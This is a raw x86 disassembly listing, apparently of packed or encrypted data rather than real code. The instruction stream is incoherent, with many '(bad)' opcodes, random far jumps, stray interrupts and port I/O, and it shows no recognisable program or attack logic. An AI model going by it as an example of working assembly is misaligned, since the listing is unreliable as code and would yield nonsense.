  40a78a:	jne    0x40a748
  40a78c:	les    edi,FWORD PTR [ecx+edi*4]
  40a78f:	xchg   esi,eax
  40a790:	int    0xcb
  40a792:	fiadd  DWORD PTR [edi]
  40a794:	jg     0x40a7d7
  40a796:	cmc    
  40a797:	int    0x72
  40a799:	fs ins DWORD PTR es:[edi],dx
  40a79b:	jecxz  0x40a7ca
  40a79d:	fadd   st,st(6)
  40a79f:	or     DWORD PTR [eax],eax
  40a7a1:	cmp    ah,ah
  40a7a3:	sbb    edx,0x4
  40a7a6:	push   ebp
  40a7a7:	add    ch,0x9b
  40a7aa:	jns    0x40a769
  40a7ac:	test   ebp,0x42a970ce
  40a7b2:	pop    ecx
  40a7b3:	add    ebp,DWORD PTR [ebx+0x20976a9c]
  40a7b9:	bound  eax,QWORD PTR [ebx]
  40a7bb:	xor    DWORD PTR [ebp-0x3d],0x38
  40a7bf:	out    dx,al
  40a7c0:	add    DWORD PTR [ecx],edi
  40a7c2:	dec    ecx
  40a7c3:	sbb    eax,0xb0d32112
  40a7c8:	out    0x3c,eax
  40a7ca:	cdq    
  40a7cb:	mov    eax,0x68a65734
  40a7d0:	and    eax,eax
  40a7d2:	jno    0x40a7f4
  40a7d4:	push   edx
  40a7d5:	loopne 0x40a7da
  40a7d7:	mov    esp,0x5d680353
  40a7dc:	int    0x86
  40a7de:	pop    ebx
  40a7df:	xlat   BYTE PTR ds:[ebx]
  40a7e0:	cmp    al,0x2
  40a7e2:	pop    edi
  40a7e3:	sahf   
  40a7e4:	addr16 xor eax,0x96d8f0cd
  40a7ea:	js     0x40a7d4
  40a7ec:	ficom  DWORD PTR [ecx-0x1052ad3d]
  40a7f2:	jbe    0x40a7d6
  40a7f4:	cmp    BYTE PTR [ecx],ch
  40a7f6:	arpl   WORD PTR [esi+0x34],sp
  40a7f9:	mov    eax,ds:0x70f9a306
  40a7fe:	jbe    0x40a7f3
  40a800:	fsubr  DWORD PTR [edi-0x3a]
  40a803:	xchg   esp,eax
  40a804:	pop    ss
  40a805:	jmp    0x40a7f5
  40a807:	fiadd  WORD PTR [esi-0x15868fe3]
  40a80d:	mov    bl,0xaa
  40a80f:	(bad)  
  40a810:	dec    ecx
  40a811:	xor    al,0xc8
  40a813:	ins    DWORD PTR es:[edi],dx
  40a814:	fwait
  40a815:	jnp    0x40a7d6
  40a817:	leave  
  40a818:	push   edx
  40a819:	push   esi
  40a81a:	mov    ecx,0x41fe4e4d
  40a81f:	pop    esp
  40a820:	fsubr  QWORD PTR [ebp+0x11]
  40a823:	sub    DWORD PTR [edx],edi
  40a825:	leave  
  40a826:	and    al,0x82
  40a828:	rol    BYTE PTR [ebx-0x1],cl
  40a82b:	pop    esp
  40a82c:	jb     0x40a83d
  40a82e:	lahf   
  40a82f:	cmp    DWORD PTR [ebp-0x603453ab],0xffffff89
  40a836:	scas   eax,DWORD PTR es:[edi]
  40a837:	(bad)  
  40a838:	sahf   
  40a839:	icebp  
  40a83a:	fmul   st(7),st
  40a83c:	mov    esi,0x350b28ab
  40a841:	and    al,0x5d
  40a843:	imul   esp,DWORD PTR [esi+0xc],0xb24d0326
  40a84a:	xor    DWORD PTR [bp+di+0x43],0xf399ee34
  40a852:	mov    ebx,0xcf6e272f
  40a857:	in     eax,dx
  40a858:	mov    edx,0x6be4da2d
  40a85d:	lahf   
  40a85e:	test   esi,ebp
  40a860:	mov    edi,es
  40a862:	fisubr DWORD PTR ds:0x46638e77
  40a868:	pop    ss
  40a869:	push   esi
  40a86a:	cmp    eax,0xbf2440a3
  40a86f:	pop    ecx
  40a870:	jge    0x40a819
  40a872:	imul   eax,DWORD PTR ds:0xdc8848d4,0x52
  40a879:	std    
  40a87a:	push   edi
  40a87b:	pop    ecx
  40a87c:	jns    0x40a8dc
  40a87e:	and    bh,BYTE PTR [esi+ebp*8]
  40a881:	add    eax,0x3186b0f8
  40a886:	dec    ebx
  40a887:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a888:	outs   dx,DWORD PTR ds:[esi]
  40a889:	dec    edx
  40a88a:	pop    esi
  40a88b:	sub    dh,bl
  40a88d:	mov    ch,0xb5
  40a88f:	addr16 pop ebx
  40a891:	iret   
  40a892:	sbb    eax,eax
  40a894:	xchg   ebx,eax
  40a895:	daa    
  40a896:	mov    ebx,0x2f194eb1
  40a89b:	sahf   
  40a89c:	sahf   
  40a89d:	ret    0xb731
  40a8a0:	jmp    0xac96:0xbd1fd616
  40a8a7:	fmul   QWORD PTR [esi-0x1397aa1b]
  40a8ad:	inc    edi
  40a8ae:	mov    esp,0xd617833a
  40a8b3:	les    ecx,FWORD PTR [ecx+ebp*8+0x172f9b15]
  40a8ba:	mov    ecx,0x30f0b8d5
  40a8bf:	les    eax,FWORD PTR [edx-0x5c]
  40a8c2:	pop    esp
  40a8c3:	pop    ecx
  40a8c4:	iret   
  40a8c5:	jp     0x40a8cf
  40a8c7:	push   ds
  40a8c8:	dec    esp
  40a8c9:	outs   dx,DWORD PTR ds:[esi]
  40a8ca:	bound  esi,QWORD PTR [esi]
  40a8cc:	mov    cl,0x92
  40a8ce:	push   eax
  40a8cf:	dec    esp
  40a8d0:	shl    cl,1
  40a8d2:	mov    ds,edi
  40a8d4:	into   
  40a8d5:	or     BYTE PTR [ebx],0xe3
  40a8d8:	ja     0x40a933
  40a8da:	lahf   
  40a8db:	dec    ecx
  40a8dc:	test   DWORD PTR [ebp+0x4799813b],edx
  40a8e2:	je     0x40a895
  40a8e4:	jno    0x40a8bd
  40a8e6:	leave  
  40a8e7:	fist   WORD PTR [edx+0x1e6c5133]
  40a8ed:	iret   
  40a8ee:	adc    BYTE PTR [eax+edi*1],dl
  40a8f1:	xor    ah,ah
  40a8f3:	mov    ebx,0x26d9f81f
  40a8f8:	sub    DWORD PTR [ebp+0x2513dfb0],0x44
  40a8ff:	stc    
  40a900:	mov    dh,0x22
  40a902:	ja     0x40a900
  40a904:	dec    esi
  40a905:	mov    al,0xfe
  40a907:	jnp    0x40a912
  40a909:	jecxz  0x40a953
  40a90b:	xchg   edx,eax
  40a90c:	loope  0x40a904
  40a90e:	lods   eax,DWORD PTR ds:[esi]
  40a90f:	outs   dx,BYTE PTR ds:[esi]
  40a910:	xchg   ebp,eax
  40a911:	dec    ebx
  40a912:	pop    ecx
  40a913:	sbb    eax,0x293b10fe
  40a918:	dec    edx
  40a919:	mov    edx,0x6e5430bd
  40a91e:	jge    0x40a937
  40a920:	gs push edx
  40a922:	repnz hlt 
  40a924:	mov    esp,0xec0b38ec
  40a929:	cdq    
  40a92a:	and    bl,bl
  40a92c:	outs   dx,BYTE PTR ds:[esi]
  40a92d:	push   ebx
  40a92e:	ret    0x733c
  40a931:	inc    ebp
  40a932:	sub    dl,BYTE PTR [eax+ebp*4-0xe14e78c]
  40a939:	xchg   ebp,eax
  40a93a:	ret    
  40a93b:	in     eax,dx
  40a93c:	sbb    DWORD PTR [ecx-0x70b88a9f],0x17
  40a943:	xchg   edi,eax
  40a944:	mov    edi,0x422101be
  40a949:	mov    ch,0xfe
  40a94b:	inc    esp
  40a94c:	jge    0x40a985
  40a94e:	mul    cl
  40a950:	sahf   
  40a951:	xchg   ecx,eax
  40a952:	fsubp  st(4),st
  40a954:	xor    BYTE PTR [ebx+0x4a],0xd2
  40a958:	mov    ds:0x2da8de92,al
  40a95d:	and    DWORD PTR [ebp-0x56],0x16
  40a961:	in     eax,0xf
  40a963:	push   esp
  40a964:	mov    BYTE PTR [edx-0x23],cl
  40a967:	jbe    0x40a959
  40a969:	xchg   ecx,eax
  40a96a:	dec    eax
  40a96b:	inc    ebx
  40a96c:	dec    esi
  40a96d:	imul   ecx,DWORD PTR [eax+0xab13993],0xaf1f35f0
  40a977:	mov    esi,0x73cbe89a
  40a97c:	mov    bl,0x9f
  40a97e:	enter  0xff77,0xfa
  40a982:	inc    ebx
  40a983:	jecxz  0x40a9db
  40a985:	jnp    0x40a9e3
  40a987:	cwde   
  40a988:	add    eax,0xb2256166
  40a98d:	sbb    al,0x11
  40a98f:	ret    
  40a990:	xchg   DWORD PTR [esi-0x646bec11],esp
  40a996:	push   es
  40a997:	(bad)  
  40a999:	int3   
  40a99a:	or     al,0x34
  40a99c:	repz cmp ecx,ecx
  40a99f:	icebp  
  40a9a0:	mov    ds:0x1ab9b644,eax
  40a9a5:	pop    edx
  40a9a6:	pop    edx
  40a9a7:	or     DWORD PTR [ecx+edi*4-0x635f741a],esi
  40a9ae:	or     eax,0x6b6f9e9d
  40a9b3:	mov    ch,0x99
  40a9b5:	inc    ebx
  40a9b6:	outs   dx,BYTE PTR ds:[esi]
  40a9b7:	loopne 0x40a96f
  40a9b9:	fistp  WORD PTR [ecx-0x19309568]
  40a9bf:	imul   esp,DWORD PTR [ecx-0x65fcfcc7],0xffffffc9
  40a9c6:	push   esp
  40a9c7:	mov    esi,0x5ba1dd54
  40a9cc:	sbb    BYTE PTR [esi],0x6b
  40a9cf:	inc    eax
  40a9d0:	xor    ch,ch
  40a9d2:	lods   eax,DWORD PTR ds:[esi]
  40a9d3:	out    0x6d,eax
  40a9d5:	inc    ecx
  40a9d6:	test   BYTE PTR [ebp+0x6f6efdc0],ah
  40a9dc:	mov    ?,esi
  40a9de:	pop    ecx
  40a9df:	icebp  
  40a9e0:	imul   edi,DWORD PTR [edx+0x402dcd54],0xa86d323d
  40a9ea:	push   edx
  40a9eb:	pushf  
  40a9ec:	data16 jg 0x40a97b
  40a9ef:	push   esi
  40a9f0:	addr16 sbb eax,0xda442c93
  40a9f6:	inc    edi
  40a9f7:	scas   al,BYTE PTR es:[edi]
  40a9f8:	addr16 in eax,dx
  40a9fa:	dec    eax
  40a9fb:	cwde   
  40a9fc:	and    eax,0x3ad8700e
  40aa01:	dec    eax
  40aa02:	xor    eax,0xc4f6f5a8
  40aa07:	fcomp  QWORD PTR [ebx+ecx*8]
  40aa0a:	cs in  eax,0xde
  40aa0d:	int    0xc9
  40aa0f:	mov    ds:0xaa379dce,al
  40aa14:	sub    bh,BYTE PTR fs:[ecx]
  40aa17:	mov    ebx,0x89bdb2b4
  40aa1c:	daa    
  40aa1d:	fcmovnb st,st(6)
  40aa1f:	loopne 0x40a9b3
  40aa21:	inc    ecx
  40aa22:	sbb    bl,BYTE PTR [eax-0x30]
  40aa25:	es xchg ecx,eax
  40aa27:	idiv   ebp
  40aa29:	cmp    DWORD PTR [edi-0x41],esi
  40aa2c:	sub    BYTE PTR [esi-0x1d],bl
  40aa2f:	mov    edi,gs
  40aa31:	popa   
  40aa32:	loope  0x40aaa7
  40aa34:	push   esp
  40aa35:	test   BYTE PTR [edx-0x6a40a40a],0x64
  40aa3c:	stos   DWORD PTR es:[edi],eax
  40aa3d:	test   BYTE PTR [eax+0x40c813f9],ch
  40aa43:	test   BYTE PTR [edx-0x5e],al
  40aa46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa47:	add    al,BYTE PTR [esi]
  40aa49:	pop    ds
  40aa4a:	push   esp
  40aa4b:	mov    esi,0x9944e188
  40aa50:	test   eax,0xbf6f41d4
  40aa55:	(bad)  
  40aa56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa57:	retf   0xb783
  40aa5a:	fild   DWORD PTR [ebx]
  40aa5c:	out    0x50,al
  40aa5e:	or     BYTE PTR [esi-0x7010c01d],ah
  40aa64:	jp     0x40aa9f
  40aa66:	stos   BYTE PTR es:[edi],al
  40aa67:	dec    ebx
  40aa68:	lods   eax,DWORD PTR ds:[esi]
  40aa69:	in     al,dx
  40aa6a:	mov    ebp,0x6776f725
  40aa6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa70:	adc    BYTE PTR [esi+0x7800babe],0xee
  40aa77:	dec    esp
  40aa78:	and    eax,0xd1b5b2c2
  40aa7d:	dec    esp
  40aa7e:	fidivr WORD PTR [esi]
  40aa80:	dec    eax
  40aa81:	push   esi
  40aa82:	mov    dh,0xe5
  40aa84:	jp     0x40aa19
  40aa86:	xor    al,0x13
  40aa88:	in     al,0x3b
  40aa8a:	push   edi
  40aa8b:	dec    esp
  40aa8c:	fst    st(2)
  40aa8e:	bound  esi,QWORD PTR [ecx-0x42]
  40aa91:	lods   eax,DWORD PTR ds:[esi]
  40aa92:	mov    ch,0xd6
  40aa94:	iret   
  40aa95:	pop    esi
  40aa96:	push   edi
  40aa97:	xor    al,0x8f
  40aa99:	sbb    eax,0xd93228eb
  40aa9e:	mov    dl,0xa8
  40aaa0:	and    bh,ch
  40aaa2:	pushf  
  40aaa3:	xor    ah,BYTE PTR [esi+0x789cb92f]
  40aaa9:	(bad)  
  40aaaa:	in     al,0x5d
  40aaac:	push   esi
  40aaad:	les    edx,FWORD PTR [eax+ebp*8-0x4c]
  40aab1:	mov    eax,0xa20e20b3
  40aab6:	xor    DWORD PTR [ebx-0x22],esi
  40aab9:	inc    ecx
  40aaba:	pop    esi
  40aabb:	push   ss
  40aabc:	xchg   esp,eax
  40aabd:	mov    bp,0x5036
  40aac1:	sahf   
  40aac2:	cld    
  40aac3:	cmp    DWORD PTR [edi-0x3b8d4b2d],0xb6a120ce
  40aacd:	iret   
  40aace:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aacf:	xor    al,0x8a
  40aad1:	push   ecx
  40aad2:	jmp    0x7f62:0x8feb1f5c
  40aad9:	in     al,dx
  40aada:	jns    0x40aa5e
  40aadc:	fsubr  DWORD PTR [edx-0x71]
  40aadf:	fld    st(1)
  40aae1:	loop   0x40aac2
  40aae3:	js     0x40aa91
  40aae5:	popa   
  40aae6:	pushf  
  40aae7:	int    0xaf
  40aae9:	xor    eax,0x9d61ae71
  40aaee:	xchg   esi,eax
  40aaef:	enter  0x7218,0x46
  40aaf3:	xor    ebp,DWORD PTR es:[ecx]
  40aaf6:	idiv   ah
  40aaf8:	into   
  40aaf9:	xrelease mov DWORD PTR [ebp+0x1e3ae41],ebp
  40ab00:	fldenv [eax+0x415c7e10]
  40ab06:	sbb    dh,dh
  40ab08:	pop    edx
  40ab09:	popa   
  40ab0a:	adc    eax,0xf34489a2
  40ab0f:	aas    
  40ab10:	jae    0x40aaed
  40ab12:	iret   
  40ab13:	int    0xac
  40ab15:	repz repnz dec ecx
  40ab18:	fist   DWORD PTR [esi-0x72a1b1e6]
  40ab1e:	fwait
  40ab1f:	add    DWORD PTR [ecx+ebp*1-0x45dffc30],eax
  40ab26:	mov    al,0xcc
  40ab28:	inc    eax
  40ab29:	out    dx,al
  40ab2a:	scas   eax,DWORD PTR es:[edi]
  40ab2b:	jmp    0x8500:0xf6d4d640
  40ab32:	xor    al,0x45
  40ab34:	mov    bl,0x1
  40ab36:	int3   
  40ab37:	mov    eax,ecx
  40ab39:	enter  0x312b,0xd3
  40ab3d:	(bad)  
  40ab3e:	ret    0x1391
  40ab41:	(bad)  
  40ab43:	(bad)  
  40ab44:	ds aam 0x84
  40ab47:	and    bh,ah
  40ab49:	out    0xf0,al
  40ab4b:	loope  0x40ab40
  40ab4d:	xchg   esi,eax
  40ab4e:	div    ecx
  40ab50:	pop    ds
  40ab51:	hlt    
  40ab52:	out    dx,al
  40ab53:	out    dx,al
  40ab54:	add    cl,BYTE PTR [ebp-0x46]
  40ab57:	jg     0x40aba9
  40ab59:	(bad)  
  40ab5a:	push   ebx
  40ab5b:	fistp  WORD PTR [ecx-0x32]
  40ab5e:	sub    edx,DWORD PTR [esi-0x6e]
  40ab61:	xchg   edx,eax
  40ab62:	lods   al,BYTE PTR ds:[esi]
  40ab63:	fwait
  40ab64:	and    BYTE PTR [edi+0x222d6dc],dl
  40ab6a:	xchg   ebp,eax
  40ab6b:	jge    0x40ab55
  40ab6d:	mov    DWORD PTR [edi-0x2864c49d],eax
  40ab73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab74:	lods   eax,DWORD PTR ds:[esi]
  40ab75:	in     al,dx
  40ab76:	jne    0x40ab06
  40ab78:	daa    
  40ab79:	call   0xb504:0x879ce804
  40ab80:	push   0xd
  40ab82:	cmp    eax,0xd6117806
  40ab87:	push   ecx
  40ab88:	xchg   BYTE PTR [bp+si-0x71],cl
  40ab8c:	pop    esp
  40ab8d:	xor    cl,BYTE PTR [eax+ebx*2+0x76fc08ca]
  40ab94:	cdq    
  40ab95:	inc    esp
  40ab96:	push   edi
  40ab97:	aad    0xd9
  40ab99:	aam    0x97
  40ab9b:	or     DWORD PTR [edx],edi
  40ab9d:	imul   DWORD PTR [eax]
  40ab9f:	push   ecx
  40aba0:	test   al,0x13
  40aba2:	jns    0x40aba6
  40aba4:	loope  0x40abfb
  40aba6:	or     DWORD PTR [ebx],ebp
  40aba8:	lods   eax,DWORD PTR ds:[esi]
  40aba9:	imul   edx,DWORD PTR [ebx-0x15],0x7fe5dbe6
  40abb0:	cli    
  40abb1:	bound  esi,QWORD PTR [ebx+0x4a]
  40abb4:	push   ecx
  40abb5:	pop    es
  40abb6:	mov    eax,0xa5d293c0
  40abbb:	xchg   ebx,eax
  40abbc:	xor    DWORD PTR [edi+0x74846321],ebx
  40abc2:	cli    
  40abc3:	inc    ebp
  40abc4:	cmp    ebx,DWORD PTR [eax+0x44]
  40abc7:	push   ebx
  40abc8:	js     0x40abce
  40abca:	push   edx
  40abcb:	and    esp,DWORD PTR [eax-0x19e8e284]
  40abd1:	pop    ss
  40abd2:	mov    dl,0xc2
  40abd4:	mov    bh,0x73
  40abd7:	and    DWORD PTR [edx],0xffffffdc
  40abda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abdb:	call   0x7c9e:0x30fba100
  40abe2:	mov    es,WORD PTR [ebp-0x72]
  40abe5:	xchg   ecx,eax
  40abe6:	sahf   
  40abe7:	test   BYTE PTR [ecx-0x716e7bb0],dh
  40abed:	jmp    0x94ac:0xc21ef463
  40abf4:	or     cl,bh
  40abf6:	cmp    cl,al
  40abf8:	daa    
  40abf9:	and    BYTE PTR [edx+edi*8-0x3f80dd4c],ch
  40ac00:	dec    edx
  40ac01:	daa    
  40ac02:	adc    cl,BYTE PTR [eax-0x7b2d537]
  40ac08:	scas   eax,DWORD PTR es:[edi]
  40ac09:	pushf  
  40ac0a:	(bad)  
  40ac0b:	jl     0x40abf0
  40ac0d:	popa   
  40ac0e:	test   BYTE PTR [ecx+0x3],al
  40ac11:	mov    edx,0xe86ac4b8
  40ac16:	or     dl,BYTE PTR ds:0x65a57467
  40ac1c:	call   0x3ecec581
  40ac21:	test   BYTE PTR [ebx+0x213656f4],0x48
  40ac28:	or     BYTE PTR [esp+edx*1+0x18f41a85],0x4
  40ac30:	imul   esi,DWORD PTR [ecx-0x181cc25e],0x3
  40ac37:	inc    ecx
  40ac38:	imul   ebp,edi,0x6e1dea8
  40ac3e:	adc    DWORD PTR [eax],esp
  40ac40:	test   BYTE PTR [edi],ah
  40ac42:	and    bl,al
  40ac44:	mov    edi,0x692b0e25
  40ac49:	mov    DWORD PTR [edi+ecx*8-0x5d],ecx
  40ac4d:	push   esi
  40ac4e:	sbb    eax,0xf53b8101
  40ac53:	imul   ecx,DWORD PTR [esi+0x79],0xffffffbc
  40ac57:	and    DWORD PTR [eax+0x4f42a295],edi
  40ac5d:	fdiv   DWORD PTR [ecx]
  40ac5f:	mov    DWORD PTR [ebp-0x24],0x4dc92bb3
  40ac66:	test   dl,dl
  40ac68:	xchg   ecx,eax
  40ac69:	cli    
  40ac6a:	mov    edi,0x2bc4dd4b
  40ac6f:	jo     0x40ac26
  40ac71:	popf   
  40ac72:	ds (bad) 
  40ac74:	jmp    DWORD PTR [esp+ebp*2-0x2e171756]
  40ac7b:	enter  0xa526,0x3
  40ac7f:	(bad)  
  40ac80:	pop    edx
  40ac81:	inc    ecx
  40ac82:	lock sub al,0x83
  40ac85:	test   al,dh
  40ac87:	pusha  
  40ac88:	lock or esi,DWORD PTR [edi]
  40ac8b:	addr16 cs xor al,0x8b
  40ac8f:	pop    edi
  40ac90:	mov    eax,0x9c8da29e
  40ac95:	ins    DWORD PTR es:[edi],dx
  40ac96:	push   esi
  40ac97:	(bad)  
  40ac98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac99:	mov    edi,0x49f46097
  40ac9e:	jbe    0x40ac32
  40aca0:	xlat   BYTE PTR ds:[ebx]
  40aca1:	ins    DWORD PTR es:[edi],dx
  40aca2:	into   
  40aca3:	dec    esp
  40aca4:	add    BYTE PTR [edi-0x6],al
  40aca7:	(bad)
  40acaa:	adc    cl,BYTE PTR [ecx+0x57]
  40acad:	std    
  40acae:	pop    ss
  40acaf:	out    0xf4,al
  40acb1:	repz sar bh,1
  40acb4:	xchg   edi,esp
  40acb6:	xchg   esi,eax
  40acb7:	mul    DWORD PTR [ebp+0x20a49cb2]
  40acbd:	and    BYTE PTR [eax],bh
  40acbf:	idiv   ch
  40acc1:	dec    esi
  40acc2:	cmp    ah,BYTE PTR [ecx+0x4f]
  40acc5:	and    al,BYTE PTR [ecx+0x58]
  40acc8:	or     eax,0xa887211d
  40accd:	js     0x40ac64
  40accf:	repz dec ecx
  40acd1:	jb     0x40ac7d
  40acd3:	dec    ebx
  40acd4:	xchg   DWORD PTR [edi-0x29b2efa4],eax
  40acda:	mov    ds:0xa8a60da4,eax
  40acdf:	outs   dx,BYTE PTR ds:[esi]
  40ace0:	scas   al,BYTE PTR es:[edi]
  40ace1:	adc    al,0xbe
  40ace3:	ret    
  40ace4:	int    0x8d
  40ace6:	cmp    DWORD PTR [ebx-0x2c],ebx
  40ace9:	ss je  0x40acee
  40acec:	cmc    
  40aced:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acee:	in     eax,0x1b
  40acf0:	or     eax,0xd52afb9
  40acf5:	pop    edx
  40acf6:	rcr    BYTE PTR [ecx-0x14a833ca],1
  40acfc:	pop    esp
  40acfd:	and    eax,0x4584b365
  40ad02:	aam    0x6b
  40ad04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad05:	sub    dh,BYTE PTR [ecx]
  40ad07:	fidiv  WORD PTR [edi]
  40ad09:	loopne 0x40ad7f
  40ad0b:	inc    ecx
  40ad0c:	dec    ecx
  40ad0d:	mov    gs,ebp
  40ad0f:	mov    dl,0xbb
  40ad11:	pop    es
  40ad12:	mov    esp,0x41012488
  40ad17:	repz and al,0x4
  40ad1a:	test   al,0x70
  40ad1c:	add    edi,edx
  40ad1e:	es mov esp,0x6c3d7449
  40ad24:	rcl    BYTE PTR [edx+esi*1+0x35],1
  40ad28:	int3   
  40ad29:	xor    al,0xf
  40ad2b:	pop    esi
  40ad2c:	ins    BYTE PTR es:[edi],dx
  40ad2d:	ja     0x40ad7f
  40ad2f:	clc    
  40ad30:	fwait
  40ad31:	mov    cl,0x5c
  40ad33:	mov    dl,0x44
  40ad35:	out    0xa5,al
  40ad37:	ret    
  40ad38:	dec    ebx
  40ad39:	leave  
  40ad3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad3b:	mov    edi,0xff0a391a
  40ad40:	add    edi,DWORD PTR [edx+0x74d0bc6f]
  40ad46:	ror    BYTE PTR [ebp+0x241418ba],1
  40ad4c:	pop    ebp
  40ad4d:	int3   
  40ad4e:	(bad)  
  40ad4f:	cmp    dh,dl
  40ad51:	or     BYTE PTR [ecx+0x380e9e98],dh
  40ad57:	xchg   ebp,eax
  40ad58:	jle    0x40ad09
  40ad5a:	dec    edx
  40ad5b:	xchg   ebp,eax
  40ad5c:	pop    es
  40ad5d:	cmp    DWORD PTR [eax],ecx
  40ad5f:	mov    ds:0x189697d,al
  40ad64:	ret    0x3c64
  40ad67:	lods   eax,DWORD PTR ds:[esi]
  40ad68:	xor    bh,cl
  40ad6a:	jmp    0x5ac60dfc
  40ad6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad70:	sahf   
  40ad71:	add    ebp,ebp
  40ad73:	jp     0x40ade3
  40ad75:	out    dx,eax
  40ad76:	fiadd  WORD PTR [ecx+0xb]
  40ad79:	aad    0xec
  40ad7b:	in     al,dx
  40ad7c:	fsubr  DWORD PTR [ecx]
  40ad7e:	ss fsubp st(0),st
  40ad81:	shl    dh,1
  40ad83:	add    ecx,DWORD PTR [edx]
  40ad85:	xchg   BYTE PTR [ecx],ah
  40ad87:	dec    ecx
  40ad88:	mov    bh,0x93
  40ad8a:	cmp    al,0xbf
  40ad8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad8d:	sahf   
  40ad8e:	mov    ebp,0x894334db
  40ad93:	cs jl  0x40ad3c
  40ad96:	lods   ax,WORD PTR ds:[esi]
  40ad98:	icebp  
  40ad99:	ss sub al,0xea
  40ad9c:	in     al,dx
  40ad9d:	jge    0x40adaf
  40ad9f:	jo     0x40ad46
  40ada1:	aas    
  40ada2:	(bad)  
  40ada3:	test   al,0x86
  40ada5:	or     eax,0x70afb93d
  40adaa:	sahf   
  40adab:	bound  ebx,QWORD PTR [eax-0x27]
  40adae:	mov    cl,0x17
  40adb0:	and    DWORD PTR [edx+0x1a6a792c],edi
  40adb6:	ss mov cl,0x6e
  40adb9:	jmp    DWORD PTR ds:0x9647a26f
  40adbf:	mov    bl,BYTE PTR ss:[esi-0x3d]
  40adc3:	cmp    eax,0x2e43bbf5
  40adc8:	fdivp  st(7),st
  40adca:	adc    DWORD PTR [esi+0x5383e502],eax
  40add0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40add1:	sbb    DWORD PTR [eax-0xd],esi
  40add4:	xchg   ebp,eax
  40add5:	cli    
  40add6:	and    DWORD PTR [esi],edx
  40add8:	mov    esi,0xcaaf9589
  40addd:	adc    esi,ebx
  40addf:	jb     0x40ada4
  40ade1:	xchg   esi,eax
  40ade2:	sbb    esp,DWORD PTR [esi+edi*4-0x5b]
  40ade6:	xor    al,0x40
  40ade8:	mov    ds:0xb627773c,eax
  40aded:	aam    0x51
  40adef:	inc    edx
  40adf0:	mov    ebx,0xa678228
  40adf5:	and    BYTE PTR [edx+0x306cedf3],dh
  40adfb:	push   cs
  40adfc:	cmc    
  40adfd:	pop    edi
  40adfe:	cmp    al,0x61
  40ae00:	ret    0x181b
  40ae03:	dec    ebx
  40ae04:	pop    esp
  40ae05:	cdq    
  40ae06:	ds push ss
  40ae08:	push   0xb81036e4
  40ae0d:	mov    WORD PTR [eax+0x241e25a1],?
  40ae13:	or     al,0xc6
  40ae15:	outs   dx,DWORD PTR ds:[esi]
  40ae16:	jno    0x40ae89
  40ae18:	ret    
  40ae19:	mov    ecx,0xe73fd925
  40ae1e:	fld    QWORD PTR [ebx-0x55]
  40ae21:	icebp  
  40ae22:	inc    edi
  40ae23:	rol    BYTE PTR [edx],cl
  40ae25:	dec    ebx
  40ae26:	push   ds
  40ae27:	xchg   ecx,eax
  40ae28:	mov    al,ds:0xb7af7707
  40ae2d:	jmp    0x10f7:0x2cac37fa
  40ae34:	mov    esi,0x3ecf065f
  40ae39:	and    al,0xbc
  40ae3b:	retf   0xdda7
  40ae3e:	or     eax,0x43cb3346
  40ae43:	mov    cl,0x76
  40ae45:	sub    al,0x63
  40ae47:	inc    ebp
  40ae49:	jle    0x40ae4c
  40ae4b:	retf   
  40ae4c:	push   ss
  40ae4d:	jge    0x40aea2
  40ae4f:	jmp    0x18486441
  40ae54:	call   0x2759:0xa03374f3
  40ae5b:	sub    DWORD PTR [ebp-0x65c33303],esi
  40ae61:	jge    0x40ae2e
  40ae63:	and    edi,DWORD PTR ds:0x38d199ec
  40ae69:	aaa    
  40ae6a:	pop    esp
  40ae6b:	inc    DWORD PTR [ebx+0x3]
  40ae6e:	push   0xffffffa0
  40ae70:	mov    BYTE PTR [ecx+0x1e],cl
  40ae73:	xor    eax,0x7c66c96b
  40ae78:	(bad)  
  40ae79:	add    BYTE PTR [ebx-0xe],bl
  40ae7c:	popf   
  40ae7d:	mov    cl,0x99
  40ae7f:	sub    eax,0xae8419c9
  40ae84:	aam    0x94
  40ae86:	jp     0x40aeb3
  40ae88:	fsub   DWORD PTR [eax-0x2ce6bb79]
  40ae8e:	pop    dx
  40ae90:	ret    0xca0a
  40ae93:	mov    esp,0xabc0a137
  40ae98:	shl    DWORD PTR [esi+0x35bed2f3],1
  40ae9e:	popa   
  40ae9f:	cwde   
  40aea0:	jns    0x40ae59
  40aea2:	ret    
  40aea3:	ja     0x40ae70
  40aea5:	sub    DWORD PTR [edi],0xfffffffd
  40aea8:	inc    esi
  40aea9:	retf   
  40aeaa:	mov    ecx,0xd5b7a48
  40aeaf:	mov    dl,BYTE PTR [ecx+0x6e56375]
  40aeb5:	mov    ds:0x19326485,eax
  40aeba:	test   eax,0xb2bcbac1
  40aebf:	es int 0x90
  40aec2:	inc    ebx
  40aec3:	sbb    BYTE PTR [edx-0x7],0x51
  40aec7:	push   ss
  40aec8:	push   ebx
  40aec9:	pop    esp
  40aeca:	in     eax,0x3e
  40aecc:	jae    0x40af0b
  40aece:	cdq    
  40aecf:	adc    BYTE PTR [eax],ah
  40aed1:	addr16 push esi
  40aed3:	cmp    eax,0x42e0d24
  40aed8:	sub    DWORD PTR [ebp+0x25036073],0xffffff95
  40aedf:	and    al,0xfb
  40aee1:	pop    edi
  40aee2:	(bad)  
  40aee3:	cs std 
  40aee5:	jne    0x40af32
  40aee7:	push   edx
  40aee8:	pop    edx
  40aee9:	xchg   ebp,eax
  40aeea:	(bad)  [ecx+0x25]
  40aeed:	icebp  
  40aeee:	iret   
  40aeef:	xlat   BYTE PTR ds:[ebx]
  40aef0:	add    DWORD PTR [ecx+0x51],ebx
  40aef3:	jb     0x40ae9f
  40aef5:	mov    ds:0xa9fe77f3,al
  40aefa:	(bad)  
  40aefb:	es jb  0x40aef2
